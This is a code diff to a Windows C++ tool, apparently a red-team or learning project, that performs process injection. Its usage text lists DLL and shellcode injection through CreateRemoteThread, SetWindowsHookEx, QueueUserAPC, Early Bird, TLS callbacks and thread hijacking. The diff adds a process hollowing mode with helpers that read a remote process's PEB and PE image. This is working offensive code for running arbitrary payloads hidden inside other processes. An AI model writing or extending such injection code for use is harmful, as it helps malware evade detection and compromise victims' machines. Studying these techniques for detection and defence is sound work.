@@ -2,6 +2,8 @@
 
 #pragma warning(disable : 4996)
 
+#include "Struct.h"
+
 struct PROCESS_INFO
 {
     DWORD PID;
@@ -19,6 +21,7 @@ DWORD ProcessID;
 WCHAR DLLPath[MAX_PATH];
 WCHAR ExportFunctionName[MAX_PATH];
 WCHAR ProcessName[MAX_PATH];
+WCHAR SourceProcessName[MAX_PATH];
 WCHAR ShellCodePath[MAX_PATH];
 
 void PrintUsage();
@@ -30,6 +33,17 @@ BOOL StartExecutableAsSuspended(WCHAR* ExecutablePath, PROCESS_INFO* ProcessInfo
 void ResumeProcess(HANDLE hThread);
 void GetMainModuleInfo(DWORD PID, MODULE_INFO* ProcessInfo);
 int ChangeTheTLSCallBackFunctionInRemoteProcess(DWORD PID, MODULE_INFO* ModuleInfo, BYTE* ShellCode);
+PIMAGE_NT_HEADERS  GetNTHeaders(DWORD64 dwImageBase);
+PLOADED_IMAGE  GetLoadedImage(DWORD64 dwImageBase);
+char* GetDLLName(DWORD64 dwImageBase, IMAGE_IMPORT_DESCRIPTOR ImageImportDescriptor);
+IMAGE_DATA_DIRECTORY  GetImportDirectory(PIMAGE_NT_HEADERS pFileHeader);
+PIMAGE_IMPORT_DESCRIPTOR  GetImportDescriptors(PIMAGE_NT_HEADERS pFileHeader, IMAGE_DATA_DIRECTORY ImportDirectory);
+//PIMAGE_THUNK_DATA  GetILT(DWORD64 dwImageBase, IMAGE_IMPORT_DESCRIPTOR ImageImportDescriptor);
+//PIMAGE_THUNK_DATA  GetIAT(DWORD64 dwImageBase, IMAGE_IMPORT_DESCRIPTOR ImageImportDescriptor);
+//PIMAGE_IMPORT_BY_NAME  GetImportByName(DWORD64 dwImageBase, IMAGE_THUNK_DATA itdImportLookup);
+DWORD64  FindRemotePEB(HANDLE hProcess);
+PEBmy* ReadRemotePEB(HANDLE hProcess);
+PLOADED_IMAGE  ReadRemoteImage(HANDLE hProcess, LPCVOID lpImageBaseAddress);
 
 
 void PrintUsage() {
@@ -39,26 +53,30 @@ void PrintUsage() {
     printf("============================================\n");
     
     printf("Inject Dll in another process using CreateRemoteThread API\n");
-    printf("Process_Injection_Techniques.exe 1 -p <PID> -d <Dll Path>\n\n");
+    printf("Process_Injection_Techniques.exe 1 -p <PID> -d <Dll Full Path>\n\n");
     
     printf("Inject Dll in another process using SetWindowsHookExW API.\nNOTE: the target process should has GUI to load the dll in it, and the exprted function should check in what process it runs in before doing its work\n");
-    printf("Process_Injection_Techniques.exe 2  -d <Dll Path> -e <Export Function name it the Dll>\n\n");
+    printf("Process_Injection_Techniques.exe 2  -d <Dll Full Path> -e <Export Function name it the Dll>\n\n");
     
     printf("Inject ShellCode in another process using CreateRemoteThread API\n");
-    printf("Process_Injection_Techniques.exe 3 -p <PID> -s <ShellCode Path>\n\n");
+    printf("Process_Injection_Techniques.exe 3 -p <PID> -s <ShellCode Full Path>\n\n");
 
     printf("Inject ShellCode in another process using QueueUserAPC API.\nNOTE: the shellcode should handle the fact it will run more that once (# of threads in the process in the time of injection)\n");
-    printf("Process_Injection_Techniques.exe 4 -p <PID> -s <ShellCode Path Path>\n\n");
+    printf("Process_Injection_Techniques.exe 4 -p <PID> -s <ShellCode Full Path>\n\n");
 
     printf("Inject ShellCode in another process using Early Bird Technique\n");
-    printf("Process_Injection_Techniques.exe 5 -n <Executable Path> -s <ShellCode Path>\n\n");
+    printf("Process_Injection_Techniques.exe 5 -n <Executable Full Path> -s <ShellCode Full Path>\n\n");
 
     printf("Inject ShellCode in another process using TLS CallBack Technique.\nNOTE: the executable that you try to inject should containg TLS Callback section.\nTODO: If the executble does not has TLS Section Create new one and edit PE header.\n");
     printf("You Can inject running process the TLS Callback will be trigered when new thread is created or when thread exits, or you can start application and make it run your TLS before its EntryPoint\n");
-    printf("Process_Injection_Techniques.exe 6 {-p <PID> OR -n <Executable Path>} -s <ShellCode Path>\n\n");
+    printf("Process_Injection_Techniques.exe 6 {-p <PID> OR -n <Executable Full Path>} -s <ShellCode Full Path>\n\n");
 
     printf("Inject ShellCode in another process using Thread execution hijacking\n");
-    printf("Process_Injection_Techniques.exe 7 -p <PID> -s <ShellCode Path>\n\n");
+    printf("Process_Injection_Techniques.exe 7 -p <PID> -s <ShellCode Full Path>\n\n");
+
+    printf("Inject PE in another process using Process Hollowing\n");
+    printf("Note:Can not inject 64 version of executable under system32\n");
+    printf("Process_Injection_Techniques.exe 8 -t <Target Executable Full Path to inject> -n <Source Executable Full Path to be injected>\n\n");
 }
 
 void ParseCommandLineArgument(int argc, WCHAR* argv[]) {
@@ -127,6 +145,13 @@ void ParseCommandLineArgument(int argc, WCHAR* argv[]) {
         ProcessID = _wtoi(argv[index]);
         index = GetIndexFromCommndLineArgument(argc, argv, L"-s");
         wcscpy(ShellCodePath, argv[index]);
+        break;
+
+    case 8:
+        index = GetIndexFromCommndLineArgument(argc, argv, L"-t");
+        wcscpy(ProcessName, argv[index]);
+        index = GetIndexFromCommndLineArgument(argc, argv, L"-n");
+        wcscpy(SourceProcessName, argv[index]);
         break;
 
     default:
@@ -341,4 +366,124 @@ int ChangeTheTLSCallBackFunctionInRemoteProcess(DWORD PID, MODULE_INFO* ModuleIn
     }
 
     return 0;
+}
+
+
+
+PIMAGE_NT_HEADERS  GetNTHeaders(DWORD64 dwImageBase) {
+    return (PIMAGE_NT_HEADERS)(dwImageBase + ((PIMAGE_DOS_HEADER)dwImageBase)->e_lfanew);
+}
+
+PLOADED_IMAGE  GetLoadedImage(DWORD64 dwImageBase)
+{
+    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)dwImageBase;
+
+    PIMAGE_NT_HEADERS pNTHeaders = GetNTHeaders(dwImageBase);
+    PLOADED_IMAGE pImage = new LOADED_IMAGE();
+
+    pImage->FileHeader = (PIMAGE_NT_HEADERS)(dwImageBase + pDosHeader->e_lfanew);
+
+    pImage->NumberOfSections = pImage->FileHeader->FileHeader.NumberOfSections;
+
+    pImage->Sections = (PIMAGE_SECTION_HEADER)(dwImageBase + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));
+
+    return pImage;
+}
+
+char* GetDLLName(DWORD64 dwImageBase,IMAGE_IMPORT_DESCRIPTOR ImageImportDescriptor)
+{
+    return (char*)(dwImageBase + ImageImportDescriptor.Name);
+}
+
+IMAGE_DATA_DIRECTORY  GetImportDirectory(PIMAGE_NT_HEADERS pFileHeader)
+{
+    return pFileHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+}
+
+PIMAGE_IMPORT_DESCRIPTOR  GetImportDescriptors(PIMAGE_NT_HEADERS pFileHeader, IMAGE_DATA_DIRECTORY ImportDirectory)
+{
+    return (PIMAGE_IMPORT_DESCRIPTOR)(pFileHeader->OptionalHeader.ImageBase +
+        ImportDirectory.VirtualAddress);
+}
+
+/*PIMAGE_THUNK_DATA  GetILT(DWORD64 dwImageBase, IMAGE_IMPORT_DESCRIPTOR ImageImportDescriptor)
+{
+    return (PIMAGE_THUNK_DATA)(dwImageBase + ImageImportDescriptor.OriginalFirstThunk);
+}
+
+PIMAGE_THUNK_DATA  GetIAT(DWORD64 dwImageBase, IMAGE_IMPORT_DESCRIPTOR ImageImportDescriptor)
+{
+    return (PIMAGE_THUNK_DATA)(dwImageBase + ImageImportDescriptor.FirstThunk);
+}
+
+PIMAGE_IMPORT_BY_NAME  GetImportByName(DWORD64 dwImageBase, IMAGE_THUNK_DATA itdImportLookup)
+{
+    return (PIMAGE_IMPORT_BY_NAME)(dwImageBase + itdImportLookup.u1.AddressOfData);
+}*/
+
+DWORD64  FindRemotePEB(HANDLE hProcess)
+{
+    HMODULE hNTDLL = LoadLibraryA("ntdll");
+
+    if (!hNTDLL) {
+        printf("Error Loading Library Error Code 0x%x\n", GetLastError());
+        return -1;
+    }
+
+    FARPROC fpNtQueryInformationProcess = GetProcAddress(hNTDLL, "NtQueryInformationProcess");
+
+    if (!fpNtQueryInformationProcess) {
+        printf("Error Get NtQueryInformationProcess Address Error Code 0x%x\n", GetLastError());
+        return -1;
+    }
+
+
+    _NtQueryInformationProcess ntQueryInformationProcess = (_NtQueryInformationProcess)fpNtQueryInformationProcess;
+
+    PROCESS_BASIC_INFORMATION* pBasicInfo = new PROCESS_BASIC_INFORMATION();
+
+    DWORD64 dwReturnLength = 0;
+
+    ntQueryInformationProcess(hProcess, 0, pBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &dwReturnLength);
+
+    return (DWORD64)pBasicInfo->PebBaseAddress;
+}
+
+PEBmy* ReadRemotePEB(HANDLE hProcess)
+{
+    DWORD64 dwPEBAddress = FindRemotePEB(hProcess);
+
+    PEBmy* pPEB = new PEBmy();
+    size_t written = 0;
+    BOOL bSuccess = ReadProcessMemory(hProcess, (LPCVOID)dwPEBAddress, pPEB, sizeof(PEBmy), NULL);
+
+    if (!bSuccess) {
+        printf("Error Read Process mmory Error Code 0x%x\n", GetLastError());
+        return NULL;
+    }
+
+    return pPEB;
+}
+
+PLOADED_IMAGE  ReadRemoteImage(HANDLE hProcess, LPCVOID lpImageBaseAddress)
+{
+    BYTE* lpBuffer = new BYTE[BUFFER_SIZE];
+
+    BOOL bSuccess = ReadProcessMemory(hProcess, lpImageBaseAddress, lpBuffer, BUFFER_SIZE, 0);
+    if (!bSuccess) {
+        printf("Error Read Process mmory Error Code 0x%x\n", GetLastError());
+        return NULL;
+    }
+
+    PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)lpBuffer;
+
+    PLOADED_IMAGE pImage = new LOADED_IMAGE();
+
+    pImage->FileHeader = (PIMAGE_NT_HEADERS)(lpBuffer + pDOSHeader->e_lfanew);
+
+    pImage->NumberOfSections = pImage->FileHeader->FileHeader.NumberOfSections;
+
+    pImage->Sections = (PIMAGE_SECTION_HEADER)(lpBuffer + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));
+
+    return pImage;
 }
